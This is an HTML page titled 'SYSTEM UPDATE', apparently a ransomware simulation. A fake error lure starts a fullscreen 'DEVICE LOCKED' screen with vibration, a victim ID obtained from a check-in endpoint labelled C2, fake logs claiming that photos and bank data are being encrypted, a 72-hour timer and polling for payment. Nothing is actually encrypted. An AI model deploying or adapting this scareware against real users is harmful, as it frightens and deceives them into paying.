<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SYSTEM UPDATE</title>
    <style>
        body {
            background-color: black;
            color: red;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
            text-align: center;
        }

        #lock-screen {
            display: none;
            /* Hidden until triggered */
            width: 100%;
            height: 100%;
        }

        h1 {
            font-size: 2rem;
            margin-bottom: 10px;
        }

        .timer {
            font-size: 1.5rem;
            color: white;
            margin: 20px 0;
            font-weight: bold;
        }

        .log-container {
            width: 90%;
            height: 30vh;
            background: #111;
            border: 1px solid red;
            overflow: hidden;
            text-align: left;
            padding: 10px;
            font-size: 0.8rem;
            color: lime;
            margin-bottom: 20px;
        }

        .status {
            color: white;
            font-size: 1rem;
            margin-top: 10px;
        }

        .victim-id {
            color: yellow;
            font-size: 1.2rem;
            margin: 10px 0;
        }

        /* Flashing effect */
        @keyframes flash {
            0% {
                background-color: black;
            }

            50% {
                background-color: #200;
            }

            100% {
                background-color: black;
            }
        }

        .critical {
            animation: flash 0.5s infinite;
        }
    </style>
</head>

<body onclick="startSimulation()">

    <div id="start-btn" style="color: white; padding: 20px;">
        <h2>SYSTEM CRITICAL ERROR</h2>
        <p>Tap anywhere to troubleshoot...</p>
    </div>

    <div id="lock-screen">
        <h1>DEVICE LOCKED</h1>
        <div class="victim-id">ID: <span id="vid">CONNECTING...</span></div>
        <div class="timer" id="timer">72:00:00</div>

        <div class="log-container" id="log">
            <!-- Logs go here -->
        </div>

        <div class="status" id="payment-status">Waiting for payment...</div>
        <div style="font-size: 0.8rem; color: #555; margin-top: 20px;">Do not close this page.</div>
    </div>

    <script>
        let victimId = null;
        let paymentCheckInterval = null;

        function startSimulation() {
            document.getElementById('start-btn').style.display = 'none';
            const lockScreen = document.getElementById('lock-screen');
            lockScreen.style.display = 'flex';
            document.body.classList.add('critical');

            // 1. Request Fullscreen
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen();
            }

            // 2. Vibrate (if supported) - SOS pattern
            if (navigator.vibrate) {
                navigator.vibrate([100, 50, 100, 50, 100, 50, 500, 50, 500, 50, 500]);
            }

            // 3. Register with C2
            fetch('/api/checkin', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ key: 'MOBILE_SIMULATION' })
            })
                .then(res => res.json())
                .then(data => {
                    victimId = data.victim_id;
                    document.getElementById('vid').innerText = victimId;
                    startPolling();
                })
                .catch(err => {
                    console.error(err);
                    document.getElementById('vid').innerText = "OFFLINE-MODE";
                });

            // 4. Start Fake Logs
            const files = ['photos/vacation.jpg', 'contacts.db', 'messages_backup.xml', 'bank_app_data.enc', 'dcim/camera/img_2024.jpg'];
            const log = document.getElementById('log');
            let i = 0;
            setInterval(() => {
                if (i < 100) {
                    const f = files[Math.floor(Math.random() * files.length)];
                    const div = document.createElement('div');
                    div.innerText = `ENCRYPTING: /storage/emulated/0/${f}`;
                    log.prepend(div);
                    if (navigator.vibrate) navigator.vibrate(20); // Haptic tick
                    i++;
                }
            }, 200);

            // 5. Timer
            startTimer();
        }

        function startTimer() {
            let time = 72 * 3600;
            const el = document.getElementById('timer');
            setInterval(() => {
                time--;
                const h = Math.floor(time / 3600);
                const m = Math.floor((time % 3600) / 60);
                const s = time % 60;
                el.innerText = `${h}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
            }, 1000);
        }

        function startPolling() {
            paymentCheckInterval = setInterval(() => {
                if (!victimId) return;
                fetch(`/api/status/${victimId}`)
                    .then(res => res.json())
                    .then(data => {
                        if (data.status === 'ready' || data.status === 'KEY_SENT') {
                            unlockDevice();
                        }
                    });
            }, 2000);
        }

        function unlockDevice() {
            clearInterval(paymentCheckInterval);
            document.body.classList.remove('critical');
            document.body.style.backgroundColor = 'green';
            document.body.style.color = 'white';
            document.getElementById('lock-screen').innerHTML = `
            <h1>UNLOCKED</h1>
            <p>Payment Received.</p>
            <p>Restoring Data...</p>
            <div style="width: 80%; background: #333; height: 20px; border-radius: 10px; margin: 20px auto;">
                <div id="bar" style="width: 0%; background: lime; height: 100%; border-radius: 10px; transition: width 2s;"></div>
            </div>
        `;

            setTimeout(() => {
                document.getElementById('bar').style.width = '100%';
            }, 100);

            setTimeout(() => {
                if (document.exitFullscreen) document.exitFullscreen();
                alert("Simulation Complete. Device Restored.");
                window.location.href = "/instagram"; // Reset
            }, 3000);
        }
    </script>
</body>

</html>
